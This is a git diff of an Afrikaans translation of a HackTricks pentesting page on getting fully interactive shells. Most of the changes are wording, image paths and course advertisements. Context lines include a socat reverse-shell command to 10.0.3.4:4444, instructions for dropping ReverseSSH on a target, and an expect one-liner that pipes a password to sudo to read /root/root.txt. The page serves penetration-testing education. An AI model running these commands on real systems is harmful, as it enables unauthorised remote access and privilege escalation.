@@ -1,23 +1,29 @@
 # Volle TTYs
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
 * Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 ## Volle TTY
 
-Let daarop dat die shell wat jy in die `SHELL` veranderlike stel **moet** **lys wees binne** _**/etc/shells**_ of `Die waarde vir die SHELL veranderlike is nie in die /etc/shells lêer gevind nie. Hierdie voorval is gerapporteer`. Let ook daarop dat die volgende snippette slegs in bash werk. As jy in 'n zsh is, verander na 'n bash voordat jy die shell verkry deur `bash` te loop.
+Let daarop dat die skulp wat jy in die `SHELL` veranderlike stel **moet** wees **lys binne** _**/etc/shells**_ of `Die waarde vir die SHELL veranderlike is nie in die /etc/shells lêer gevind nie. Hierdie voorval is gerapporteer`. Let ook daarop dat die volgende snippette slegs in bash werk. As jy in 'n zsh is, verander na 'n bash voordat jy die skulp verkry deur `bash` te loop.
 
 #### Python
 
@@ -67,9 +73,9 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te plaas.
+'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te laat val.
 
-Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk na die [vrygawes bladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk [vrygawes bladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
 1. Berei plaaslik voor om die ssh poort forwarding versoek te vang:
 
@@ -124,16 +130,22 @@ As jy om een of ander rede nie 'n volle TTY kan verkry nie, kan jy **nog steeds 
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
